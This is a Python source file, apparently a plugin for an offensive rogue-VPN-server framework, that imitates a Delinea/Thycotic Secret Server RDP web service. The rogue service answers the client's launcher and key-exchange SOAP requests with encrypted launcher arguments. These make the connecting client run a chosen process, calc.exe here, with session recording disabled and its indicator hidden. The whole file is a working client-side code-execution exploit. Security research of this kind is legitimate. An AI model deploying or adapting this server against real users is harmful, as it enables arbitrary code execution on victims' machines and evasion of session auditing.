from nachovpn.plugins import VPNPlugin
from flask import request, abort, Response
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend
import xml.etree.ElementTree as ET
from urllib.parse import quote
import os
import uuid
import base64
import secrets
import json

"""
# Requests:

## GetLauncherArguments

<?xml version = "1.0" encoding="UTF-8"?>
<soap:Envelope
	xmlns:soap="http://www.w3.org/2003/05/soap-envelope"
	xmlns:urn="urn:thesecretserver.com">
	<soap:Header/>
	<soap:Body>
		<urn:GetLauncherArguments>
			<urn:guid>748294fc-9527-4182-a47b-81fcaf99f473</urn:guid>
			<urn:version>0</urn:version>
		</urn:GetLauncherArguments>
	</soap:Body>
</soap:Envelope>

## GetSymmetricKey

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope
	xmlns:soap="http://www.w3.org/2003/05/soap-envelope"
	xmlns:urn="urn:thesecretserver.com">
	<soap:Body>
		<urn:GetSymmetricKey>
			<urn:guid>748294fc-9527-4182-a47b-81fcaf99f473</urn:guid>
			<urn:publicKeyBlob>BgIAAACkAABSU0ExAAQAAAEAAQDddOOABJmRVvrS5SIrFiANNGkdYu0/ii0bp6k2NVVeymFpB9+ohAmPGqCsowJkGesV3zzGakFvuGzS3H5TVKTTK8T0idFRSfxWVihUv/7b9f50B8GTWpPFTYkCCneGD5hxYyPmwPNiNgoE9FsZCLyrffAzioSotZS2xeBZfaSzog==</urn:publicKeyBlob>
		</urn:GetSymmetricKey>
	</soap:Body>
</soap:Envelope>
"""

SECRET_SERVER_XML_NS = {
    "soap": "http://www.w3.org/2003/05/soap-envelope",
    "urn": "urn:thesecretserver.com"
    }

class DelineaPlugin(VPNPlugin):
    def __init__(self, *args, **kwargs):
        # provide the templates directory relative to this plugin
        super().__init__(*args, **kwargs, template_dir=os.path.join(os.path.dirname(__file__), 'templates'))
        
        # Store session keys for each GUID
        self.session_keys = {}
        
    def _generate_aes_keys(self):
        """Generate AES-256 key and IV"""
        aes_key = secrets.token_bytes(32)  # 256-bit key
        aes_iv = secrets.token_bytes(16)   # 128-bit IV
        return aes_key, aes_iv
    
    def _aes_encrypt(self, data, key, iv):
        """Encrypt data with AES-256-CBC"""
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
         
        # Pad data to 16-byte boundary
        padding_length = 16 - (len(data) % 16)
        padded_data = data + bytes([padding_length] * padding_length)
         
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
        return encrypted_data
     
    def _decode_rsa_public_key(self, public_key_blob):
        """Decode RSA public key from Microsoft format"""
        try:
            # Decode base64
            key_data = base64.b64decode(public_key_blob)
              
            # Microsoft RSA key format (all values in little-endian):
            # PUBLICKEYSTRUC (8 bytes):
            #   - bType: 0x06 (PUBLICKEYBLOB)
            #   - bVersion: 0x02
            #   - reserved: 0x0000
            #   - aiKeyAlg: 0x0000A400 (CALG_RSA_KEYX)
            # RSAPUBKEY (12 bytes):
            #   - magic: 0x31415352 ("RSA1")
            #   - bitlen: key length in bits (little-endian)
            #   - pubexp: public exponent (little-endian, usually 65537)
            # modulus[bitlen/8]: modulus data

            if len(key_data) < 20:  # Minimum size for header + RSAPUBKEY
                self.logger.error("Key blob too short")
                return None

            # Check for PUBLICKEYBLOB type
            if key_data[0] != 0x06:
                self.logger.error(f"Invalid blob type: {key_data[0]} (expected 0x06)")
                return None

            # Check for RSA1 magic
            if key_data[8:12] != b'RSA1':
                self.logger.error("Invalid RSA magic")
                return None

            # Read bitlen (little-endian)
            bitlen = int.from_bytes(key_data[12:16], byteorder='little')

            # Read pubexp (little-endian)
            pubexp = int.from_bytes(key_data[16:20], byteorder='little')

            # Calculate modulus length
            modulus_len = bitlen // 8

            # Extract modulus (starts at byte 20)
            if len(key_data) < 20 + modulus_len:
                self.logger.error("Key blob too short for modulus")
                return None
                
            modulus_bytes = key_data[20:20+modulus_len]

            # Convert to integers (both little-endian according to Microsoft docs)
            modulus = int.from_bytes(modulus_bytes, byteorder='little')
            exponent = pubexp

            # Debug logging
            self.logger.debug(f"Parsed RSA key - Bitlen: {bitlen}, Modulus length: {len(modulus_bytes)}, Exponent: {exponent}")
            self.logger.debug(f"Modulus bytes (first 16): {modulus_bytes[:16].hex()}")
            self.logger.debug(f"Exponent bytes: {exponent.to_bytes(4, 'little').hex()}")

            # Validate exponent
            if exponent < 3:
                self.logger.error(f"Invalid RSA exponent: {exponent} (must be >= 3)")
                return None
            if exponent >= modulus:
                self.logger.error(f"Invalid RSA exponent: {exponent} (must be < modulus)")
                return None

            # Create RSA public key
            public_key = rsa.RSAPublicNumbers(exponent, modulus).public_key(backend=default_backend())
            self.logger.debug(f"Successfully decoded RSA key: {bitlen}-bit key, exponent={exponent}")
            return public_key
              
        except Exception as e:
            self.logger.error(f"Failed to decode RSA public key: {e}")
            return None
     
    def _rsa_encrypt(self, data, public_key):
        """Encrypt data with RSA using the provided public key"""
        try:
            encrypted_data = public_key.encrypt(
                data,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA1()),
                    algorithm=hashes.SHA1(),
                    label=None
                )
            )
            return encrypted_data
        except Exception as e:
            self.logger.error(f"Failed to encrypt with RSA: {e}")
            return None
        
    def _setup_routes(self):
        # Call the parent class's route setup
        super()._setup_routes()

        # Add additional routes specific to this plugin
        @self.flask_app.route('/', methods=['GET'])
        @self.flask_app.route('/delinea', methods=['GET'])
        def index():
            guid = str(uuid.uuid4())
            session_guid = str(uuid.uuid4())
            url_encoded = quote(f"https://{self.dns_name}/SecretServer/Rdp/V1/rdpwebservice.asmx", safe='')
            xml = self.render_template('index.html', guid=guid, session_guid=session_guid, url_encoded=url_encoded)
            return Response(xml, mimetype='text/html')
        
        @self.flask_app.route('/SecretServer/Rdp/<version>/rdpwebservice.asmx', methods=['POST'])
        @self.flask_app.route('/secretserver/rdp/<version>/rdpwebservice.asmx', methods=['POST'])
        def rdpwebservice(version):
            self.logger.debug(request.data)
            if b'GetLauncherArguments' in request.data:
                # Extract GUID from request
                root = ET.fromstring(request.data)
                guid = root.find(".//urn:guid", SECRET_SERVER_XML_NS).text
                self.logger.debug(f"Extracted GUID: {guid}")
                
                # Generate AES keys for this session
                aes_key, aes_iv = self._generate_aes_keys()
                self.logger.debug(f"Generated AES key={aes_key.hex()}, IV={aes_iv.hex()}")
                
                # Store keys for later use
                self.session_keys[guid] = {
                    'aes_key': aes_key,
                    'aes_iv': aes_iv
                }
                
                # Create launcher arguments
                launcher_data = json.dumps({
                    "Domain": "aaa.com",
                    "WinProcessName": "calc.exe",
                    "WinProcessArgs": "",
                    "WinLaunchAsUser": False,
                    "WinFileToRun": "",
                    "UseWindowFormFiller": False,
                    "WinLoadUserProfile": False,
                    "WinUseShellExecute": False,
                    "Processname": "",
                    "LaunchAsUser": False,
                    "UseShellExecute": False,
                    "ProcessArgs": None,
                    "FileToRun": "",
                    "WindowsEscapeCharacter": None,
                    "WindowsCharactersToEscape": None,
                    "RecordMultipleWindows": True,
                    "AdditionalProcessesToRecord": None,
                    "UseSSHTunnel": False,
                    "ProcessTunnelArgs": None,
                    "WinProcessTunnelArgs": "",
                    "TunnelRemoteHost": None,
                    "TunnelRemotePort": None,
                    "UseSshProxy": False,
                    "SshProxyHost": None,
                    "SshProxyPort": 0,
                    "SshProxyUsername": None,
                    "SshProxyPassword": None,
                    "SshPublicKeyFingerPrint": None,
                    "PreserveClientProcess": False,
                    "SessionToken": None,
                    "SessionExpiresInSeconds": None,
                    "SessionRefreshToken": None,
                    "SSHPrivateKeyOpenSSH": None,
                    "EnableSSHVideoRecording": False,
                    "Username": "aaa",
                    "Password": "aaa",
                    "record": False,
                    "hideRecordingIndicator": True,
                    "sessionkey": guid,
                    "sessionCallbackIntervalSeconds": 60,
                    "fipsEnabled": False,
                    "Machine": None,
                    "Url": None,
                    "Server": None,
                    "FingerprintSHA1String": None,
                    "FingerprintSHA512String": None,
                    "Host": None,
                    "Port": 0,
                    "SSHPrivateKey": None,
                    "SSHPrivateKeyPassPhrase": None,
                    "MaxSessionLength": 24,
                    "InactivityTimeoutMinutes": 120,
                    "IsRDSSession": False,
                    "RecordRDSKeystrokes": False,
                    "CredentialProxyType": None,
                    "Target": ""
                    })
                
                encrypted_launcher_data = self._aes_encrypt(launcher_data.encode('utf-16-le'), aes_key, aes_iv)
                launcher_args = encrypted_launcher_data.hex()
                xml = self.render_template('GetLauncherArguments.xml', launcher_args=launcher_args)
                return Response(xml, mimetype='text/xml')
                
            elif b'GetSymmetricKey' in request.data:
                # Extract the public key and GUID
                root = ET.fromstring(request.data)
                guid = root.find(".//urn:guid", SECRET_SERVER_XML_NS).text
                public_key_blob = root.find(".//urn:publicKeyBlob", SECRET_SERVER_XML_NS).text
                
                # Get stored session keys for this GUID
                if guid not in self.session_keys:
                    self.logger.error(f"No session keys found for GUID: {guid}")
                    return abort(400)
                
                session_data = self.session_keys[guid]
                aes_key = session_data['aes_key']
                aes_iv = session_data['aes_iv']
                
                # Decode and load RSA public key
                public_key = self._decode_rsa_public_key(public_key_blob)
                if not public_key:
                    return abort(400)
                
                # Generate session keys
                session_key = secrets.token_bytes(32)
                session_iv = secrets.token_bytes(16)
                
                # Encrypt the keys with RSA
                encrypted_aes_key = self._rsa_encrypt(aes_key, public_key)
                encrypted_aes_iv = self._rsa_encrypt(aes_iv, public_key)
                encrypted_session_key = self._rsa_encrypt(session_key, public_key)
                encrypted_session_iv = self._rsa_encrypt(session_iv, public_key)
                
                if not all([encrypted_aes_key, encrypted_aes_iv, encrypted_session_key, encrypted_session_iv]):
                    return abort(500)
                
                # Base64 encode the encrypted keys
                keys = {
                    'aes_key': base64.b64encode(encrypted_aes_key).decode('utf-8'),
                    'aes_iv': base64.b64encode(encrypted_aes_iv).decode('utf-8'),
                    'session_key': base64.b64encode(encrypted_session_key).decode('utf-8'),
                    'session_iv': base64.b64encode(encrypted_session_iv).decode('utf-8')
                }
                
                xml = self.render_template('GetSymmetricKey.xml', **keys)
                return Response(xml, mimetype='text/xml')
            
            elif b'UpdateStatusV2' in request.data:
                xml = self.render_template('UpdateStatusV2.xml')
                return Response(xml, mimetype='text/xml')

            elif b'GetNextProtocolHandlerVersion' in request.data:
                xml = self.render_template('GetNextProtocolHandlerVersion.xml')
                return Response(xml, mimetype='text/xml')
            
            return abort(404)

    def handle_http(self, handler):
        if handler.command == 'GET':
            self.handle_get(handler)
        elif handler.command == 'POST':
            self.handle_post(handler)
        return True

    def can_handle_http(self, handler):
        user_agent = handler.headers.get('User-Agent', '')
        return handler.headers.get('vault-application') \
            or handler.path == '/delinea' \
            or handler.path == '/rdpwebservice.asmx' \
            or 'Thycotic' in user_agent \
            or 'MS Web Services Client Protocol' in user_agent
